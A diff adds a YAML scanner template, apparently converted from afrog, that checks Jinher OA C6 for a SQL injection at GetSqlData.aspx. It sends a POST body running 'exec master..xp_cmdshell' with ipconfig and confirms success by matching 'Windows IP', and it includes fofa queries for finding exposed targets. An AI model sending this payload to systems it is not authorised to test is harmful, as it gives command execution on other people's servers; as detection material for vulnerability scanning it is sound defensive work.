@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      exec master..xp_cmdshell 'ipconfig'
+    headers:
+      Content-Type: text/plain
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Windows IP
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/C6/Control/GetSqlData.aspx/.ashx'
+id: jinher-c6-getsqldata-sqli
+info:
+  author: zan8in
+  description: "fofa: app=\"金和网络-金和OA\" \nfofa: body=\"src=\\\"/c6/WebResource.axd\""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 金和 OA C6-GetSqlData.aspx SQL注入
+  severity: high
+  tags: jinher,sqli,argus-import
